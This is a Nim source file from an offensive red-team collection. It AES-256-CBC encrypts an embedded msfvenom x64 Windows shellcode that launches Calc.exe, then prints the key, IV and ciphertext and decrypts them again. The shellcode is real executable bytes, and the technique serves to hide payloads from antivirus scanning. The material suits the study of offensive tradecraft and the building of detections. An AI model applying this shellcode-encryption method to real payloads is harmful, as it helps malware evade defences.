#[
    Credit: @byt3bl33d3r
    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim
]#

import nimcrypto
import nimcrypto/sysrand
import sequtils

#[ pkcs7 implementation ]#
proc pad*(src: seq[int], blockSize: int): seq[int] =
    let padLen = blockSize - (len(src) mod blockSize)
    var padding = newSeq[int]()
    
    for i in 0 ..< padLen:
        padding.add(padLen) 

    return concat(src, padding)

proc unpad*(src: seq[int]): seq[int] = 
    # get last byte
    let padLen = src[^1]

    # If last byte is 0, we have a problem
    if padLen == 0:
        echo("Error unpadding")
        quit(1)
    
    # get original source len
    let ogLen = src.len - padLen

    # copy src and remove the padding
    var unpadded = src
    unpadded.delete(ogLen, src.len)
    return unpadded



# msfvenom -p windows/x64/exec CMD="C:\Windows\System32\Calc.exe" -f py
var buf: array[296, byte] = [
byte  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48,
0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c,
0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,
0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0,
0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56,
0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9,
0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58,
0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0,
0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41,
0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41,
0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06,
0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e,
0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32,
0x5c, 0x43, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00]

when isMainModule:
    var
        tmp: seq[int]
        envkey: string = "ABCDABCDABCDABCD"

        ectx, dctx: CBC[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        # plaintext = newSeq[byte](len(data))
        # enctext = newSeq[byte](len(data))
        # dectext = newSeq[byte](len(data))

    # create random iv and random key
    discard randomBytes(addr iv[0], 16)
    discard randomBytes(addr key[0], 32)

    # turn array into a sequence
    for i in 0  ..< buf.len:
        tmp.add(buf[i].int)

    # pad buffer to 16 bytes
    var padded = pad(tmp, 16)

    # copy padded buffer to plaintext
    var plaintext = newSeq[byte]()
    for i in 0 ..< padded.len:
        plaintext.add(padded[i].byte)

    # # expand key to 32 bytes using sha256 as the kdf
    # var expandedKey = sha256.digest(envkey)
    # copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    # create enctext buffer
    var enctext = newSeq[byte]()
    for i in 0 ..< padded.len:
        enctext.add(0.byte)

    # create encryption context
    ectx.init(key, iv)
    ectx.encrypt(plaintext, enctext)
    ectx.clear()

    echo "IV: ", iv
    echo "KEY: ", key
    echo "ENCRYPTED TEXT: ", enctext

    # create dectext buffer
    var dectext = newSeq[byte]()
    for i in 0 ..< enctext.len:
        dectext.add(0.byte)

    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()

    echo "DECRYPTED TEXT: ", dectext